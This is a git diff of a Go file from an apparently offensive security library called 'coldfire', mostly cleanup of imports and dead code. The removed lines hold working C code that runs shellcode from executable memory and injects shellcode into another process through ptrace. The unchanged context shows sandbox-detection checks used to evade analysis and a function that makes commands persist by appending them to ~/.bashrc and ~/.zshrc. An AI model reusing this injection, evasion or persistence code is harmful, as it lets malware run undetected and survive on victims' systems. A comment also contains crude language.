@@ -3,74 +3,14 @@
 // Linux and Windows operating systems.
 package coldfire
 
-/*
-#include <stdio.h>
-#include <stdint.h>
-#include <string.h>
-#include <stdlib.h>
-#include <sys/mman.h>
-#include <sys/ptrace.h>
-#include <sys/wait.h>
-#include <sys/user.h>
-
-#if defined(__x86_64)
-
-#define REG_IP_NAME      "rip"
-#define REG_IP_TYPE      unsigned long
-#define REG_IP_FMT       "lu"
-#define REG_IP_HEX       "lx"
-#define REG_IP_VALUE(r)  ((r).rip)
-
-#elif defined(__i386)
-
-#define REG_IP_NAME      "eip"
-#define REG_IP_TYPE      unsigned long
-#define REG_IP_FMT       "lu"
-#define REG_IP_HEX       "lx"
-#define REG_IP_VALUE(r)  ((r).eip)
-
-#endif
-
-void sc_run(char *shellcode, size_t sclen) {
-    void *ptr = mmap(0, sclen, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);
-    if (ptr == MAP_FAILED) {
-        perror("mmap");
-        exit(-1);
-    }
-    memcpy(ptr, shellcode, sclen);
-    (*(void(*) ()) ptr)();
-}
-void sc_inject(char *shellcode, size_t sclen, pid_t pid) {
-    struct user_regs_struct regs;
-    int result = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
-    if (result < 0) { exit(1); }
-    wait(NULL);
-    result = ptrace(PTRACE_GETREGS, pid, NULL, &regs);
-    if (result < 0) { exit(1); }
-    int i;
-    uint32_t *s = (uint32_t *) shellcode;
-    uint32_t *d = (uint32_t *) REG_IP_VALUE(regs);
-
-    for (i=0; i < sclen; i+=4, s++, d++) {
-        result = ptrace(PTRACE_POKETEXT, pid, d, *s);
-        if (result < 0) { exit(1); }
-    }
-    REG_IP_VALUE(regs) += 2;
-}
-
-import "C"
-*/
-
 import (
 	"fmt"
-	//humanize "github.com/dustin/go-humanize"
-	// "github.com/minio/minio/pkg/disk" bad dependency
-	ps "github.com/mitchellh/go-ps"
-	"io/ioutil"
 	"os"
 	"os/exec"
 	"strconv"
 	"strings"
+
+	ps "github.com/mitchellh/go-ps"
 )
 
 func killProcByPID(pid int) error {
@@ -128,7 +68,7 @@ func sandboxFilepath() bool {
 	return out != "none"
 }
 
-// HOTFIX - below function returns false negative, because 
+// HOTFIX - below function returns false negative, because
 // installation of minio/pkg/disk package eats dick on absolutely every platform.
 // Rewriting this function using CmdOut() or 'syscall' package would be much appreciated :>
 func sandboxDisk(size int) bool {
@@ -149,7 +89,7 @@ func sandboxDisk(size int) bool {
 
 func sandboxTmp(entries int) bool {
 	tmp_dir := "/tmp"
-	files, err := ioutil.ReadDir(tmp_dir)
+	files, err := os.ReadDir(tmp_dir)
 	if err != nil {
 		return true
 	}
@@ -274,49 +214,3 @@ func addPersistentCommand(cmd string) error {
 	_, err := cmdOut(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
 	return err
 }
-
-// func dialog(message, title string) {
-// 	zenity.Info(message, zenity.Title(title))
-// }
-
-// func SplitMultiSep(s string, seps []string) []string {
-// 	f := func(c rune) bool {
-// 		for _, sep := range seps {
-// 			if c == sep { // what?
-// 				return true
-// 			}
-// 		}
-// 	}
-// 	fields := strings.FieldsFunc(s, f)
-// 	return fields
-// }
-
-/*
-
-func keyboard_emul(keys string) error {
-
-}
-
-func proxy_tcp() error {
-
-}
-
-func proxy_udp() error {
-
-}
-
-func proxy_http() error {
-
-}
-
-func webshell(param, password string) error {
-
-}
-
-func stamp() {
-
-}
-
-func detect_user_interaction() (bool, error) {
-
-}*/
